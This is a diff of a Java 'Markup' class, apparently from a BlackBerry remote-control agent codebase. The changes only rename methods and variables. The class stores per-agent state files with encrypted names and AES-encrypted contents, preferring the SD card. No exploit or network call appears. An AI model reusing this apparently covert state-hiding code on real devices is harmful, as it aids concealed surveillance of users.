@@ -24,7 +24,7 @@ import com.ht.rcs.blackberry.utils.Utils;
 
 public class Markup {
 
-    public final static String MARKUP_EXTENSION = ".qmm";
+    public static final String MARKUP_EXTENSION = ".qmm";
 
     private static Debug debug = new Debug("Markup", DebugLevel.VERBOSE);
 
@@ -60,14 +60,14 @@ public class Markup {
         String encName = "";
 
         if (addPath) {
-            if (storeToMMC && Path.SDPresent()) {
-                encName = Path.SDPath;
+            if (storeToMMC && Path.isSDPresent()) {
+                encName = Path.SD_PATH;
             } else {
-                encName = Path.UserPath;
+                encName = Path.USER_PATH;
             }
         }
 
-        encName += Encryption.EncryptName(markupName + MARKUP_EXTENSION, Keys
+        encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, Keys
                 .getChallengeKey()[0]);
         debug.trace("makeMarkupName: " + encName);
 
@@ -141,7 +141,7 @@ public class Markup {
     public Markup(byte[] aesKey) {
         this();
         byte[] key = new byte[16];
-        Utils.Copy(key, 0, aesKey, 0, 16);
+        Utils.copy(key, 0, aesKey, 0, 16);
 
         encryption.makeKey(key);
     }
@@ -152,9 +152,9 @@ public class Markup {
         String markupName = makeMarkupName(agentId, true);
         Check.asserts(markupName != "", "markupName empty");
 
-        AutoFlashFile file = new AutoFlashFile(markupName, true);
+        AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
-        return file.exists();
+        return fileRet.exists();
     }
 
     /**
@@ -176,13 +176,13 @@ public class Markup {
         String markupName = makeMarkupName(agentId, true);
         Check.asserts(markupName != "", "markupName empty");
 
-        AutoFlashFile file = new AutoFlashFile(markupName, true);
+        AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
-        if (file.exists()) {
-            byte[] encData = file.read();
+        if (fileRet.exists()) {
+            byte[] encData = fileRet.read();
             int len = Utils.byteArrayToInt(encData, 0);
 
-            byte[] plain = encryption.DecryptData(encData, len, 4);
+            byte[] plain = encryption.decryptData(encData, len, 4);
             Check.asserts(plain != null, "wrong decryption: null");
             Check.asserts(plain.length == len, "wrong decryption: len");
 
@@ -206,15 +206,15 @@ public class Markup {
         String markupName = makeMarkupName(agentId, true);
         Check.asserts(markupName != "", "markupName empty");
 
-        AutoFlashFile file = new AutoFlashFile(markupName, true);
+        AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
-        file.create();
+        fileRet.create();
 
         if (data != null) {
-            byte[] encData = encryption.EncryptData(data);
+            byte[] encData = encryption.encryptData(data);
             Check.asserts(encData.length >= data.length, "strange data len");
-            file.write(data.length);
-            file.append(encData);
+            fileRet.write(data.length);
+            fileRet.append(encData);
         }
 
         return true;
